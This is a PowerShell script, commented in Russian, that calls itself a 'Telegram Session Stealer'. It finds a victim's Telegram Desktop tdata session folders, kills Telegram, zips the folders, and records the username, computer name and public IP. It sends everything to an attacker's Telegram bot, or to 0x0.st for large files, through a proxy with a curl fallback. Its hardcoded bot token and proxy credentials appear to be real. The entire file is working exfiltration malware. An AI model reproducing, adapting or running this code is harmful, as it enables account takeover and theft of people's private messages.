# ============================================================
# Telegram Session Stealer + 0x0.st + Global Proxy
# ============================================================

$botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
$chatId   = "8620709143"

$proxyUrl  = "http://gate.proxydata.ru:3129"
$proxyUser = "user-xpx93ax5"
$proxyPass = "5pxp942ldb7jtnh2"

$proxy = New-Object System.Net.WebProxy($proxyUrl, $true)
$proxy.Credentials = New-Object System.Net.NetworkCredential($proxyUser, $proxyPass)
[System.Net.WebRequest]::DefaultWebProxy = $proxy

# ---------- Функции ----------
function Send-TelegramMessage {
    param($text)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json -Compress

    $wc = New-Object System.Net.WebClient
    $wc.Encoding = [System.Text.Encoding]::UTF8
    $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")

    try {
        $data = [System.Text.Encoding]::UTF8.GetBytes($body)
        $wc.UploadData($url, "POST", $data) | Out-Null
        return $true
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $stream = $_.Exception.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $serverError = $reader.ReadToEnd()
            Write-Host "❌ Ошибка Telegram API: $serverError" -ForegroundColor Red
        } else {
            Write-Host "❌ Нет ответа от сервера: $($_.Exception.Message)" -ForegroundColor Red
        }
        # fallback через curl
        $tempFile = [System.IO.Path]::GetTempFileName()
        [System.IO.File]::WriteAllText($tempFile, $body, [System.Text.Encoding]::UTF8)
        $proxyAuth = "${proxyUser}:${proxyPass}"
        $cmd = "curl.exe -s -x $proxyUrl -U $proxyAuth -H 'Content-Type: application/json' -X POST -d @$tempFile $url"
        Invoke-Expression $cmd | Out-Null
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Host "❌ Другая ошибка: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    } finally {
        $wc.Dispose()
    }
}

function Upload-To0x0 {
    param($filePath)
    $wc = New-Object System.Net.WebClient
    try {
        $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
        return [System.Text.Encoding]::UTF8.GetString($response).Trim()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $stream = $_.Exception.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $serverError = $reader.ReadToEnd()
            Write-Host "❌ Ошибка 0x0.st: $serverError" -ForegroundColor Red
        }
        # fallback через curl
        $proxyAuth = "${proxyUser}:${proxyPass}"
        $tempOutput = [System.IO.Path]::GetTempFileName()
        $cmd = "curl.exe -s -x $proxyUrl -U $proxyAuth -F 'file=@$filePath' https://0x0.st -o $tempOutput"
        Invoke-Expression $cmd
        $link = Get-Content $tempOutput -Raw
        Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        return $link.Trim()
    } finally {
        $wc.Dispose()
    }
}

# ---------- Основной блок ----------
try {
    # 1. Поиск tdata
    $paths = @()
    @("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
        if (Test-Path $_) { $paths += $_ }
    }
    if ($paths.Count -eq 0) {
        Send-TelegramMessage "❌ tdata not found"
        exit
    }

    # 2. Завершаем Telegram (убеждаемся, что убит)
    Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Milliseconds 500  # даём время освободить файлы

    # 3. Архивация (надёжная)
    $zip = "$env:TEMP\diag.zip"
    if (Test-Path $zip) { Remove-Item $zip -Force }

    # Проверяем, что все папки доступны
    $validPaths = @()
    foreach ($p in $paths) {
        if (Test-Path $p) { $validPaths += $p }
    }
    if ($validPaths.Count -eq 0) {
        Send-TelegramMessage "❌ Нет доступных папок tdata"
        exit
    }

    # Используем Compress-Archive с явным указанием путей
    try {
        Compress-Archive -Path $validPaths -DestinationPath $zip -Force -ErrorAction Stop
        # Проверяем, что архив создался и не пустой
        if (-not (Test-Path $zip) -or (Get-Item $zip).Length -eq 0) {
            throw "Архив пустой или не создан"
        }
    } catch {
        # Если Compress-Archive упал, пробуем через .NET ZipFile
        Write-Host "⚠️ Compress-Archive не сработал, пробуем .NET ZipFile..." -ForegroundColor Yellow
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        try {
            $zipFile = [System.IO.Compression.ZipFile]::Open($zip, 'Create')
            foreach ($folder in $validPaths) {
                $folderItem = Get-Item $folder
                # Добавляем все файлы из папки
                Get-ChildItem -Path $folderItem.FullName -Recurse -File | ForEach-Object {
                    $relativePath = $_.FullName.Substring($folderItem.FullName.Length + 1)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
                        $zipFile,
                        $_.FullName,
                        $relativePath,
                        [System.IO.Compression.CompressionLevel]::Optimal
                    )
                }
            }
            $zipFile.Dispose()
        } catch {
            Send-TelegramMessage "❌ Ошибка создания ZIP: $_"
            exit
        }
    }

    # 4. Сбор информации
    $user = $env:USERNAME
    $comp = $env:COMPUTERNAME
    $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()
    $caption = "$user@$comp | IP: $ip"
    $size = (Get-Item $zip).Length

    # 5. Отправка
    if ($size -gt 52428800) {
        $link = Upload-To0x0 -filePath $zip
        Send-TelegramMessage "$caption`nDownload: $link"
    } else {
        # Маленький файл – multipart/form-data
        $bytes = [System.IO.File]::ReadAllBytes($zip)
        $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $multipart = @()
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="chat_id"'
        $multipart += ""
        $multipart += $chatId
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="document"; filename="diag.zip"'
        $multipart += 'Content-Type: application/zip'
        $multipart += ""
        $multipart += [System.Text.Encoding]::ASCII.GetString($bytes)
        $multipart += "--$boundary--"
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"

        $wc = New-Object System.Net.WebClient
        $wc.Encoding = [System.Text.Encoding]::UTF8
        foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }

        try {
            $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
            $wc.UploadData($url, "POST", $data) | Out-Null
        } catch [System.Net.WebException] {
            if ($_.Exception.Response) {
                $stream = $_.Exception.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($stream)
                $serverError = $reader.ReadToEnd()
                Write-Host "❌ Ошибка отправки файла: $serverError" -ForegroundColor Red
            }
            # fallback через curl
            $tempData = [System.IO.Path]::GetTempFileName()
            [System.IO.File]::WriteAllText($tempData, ($multipart -join "`r`n"), [System.Text.Encoding]::ASCII)
            $proxyAuth = "${proxyUser}:${proxyPass}"
            $cmd = "curl.exe -s -x $proxyUrl -U $proxyAuth -X POST -H 'Content-Type: multipart/form-data; boundary=$boundary' --data-binary @$tempData $url"
            Invoke-Expression $cmd | Out-Null
            Remove-Item $tempData -Force -ErrorAction SilentlyContinue
        } finally {
            $wc.Dispose()
        }
    }

    # 6. Удаляем архив
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Send-TelegramMessage "✅ Done"

} catch {
    Send-TelegramMessage "❌ Error: $($_.Exception.Message)"
}
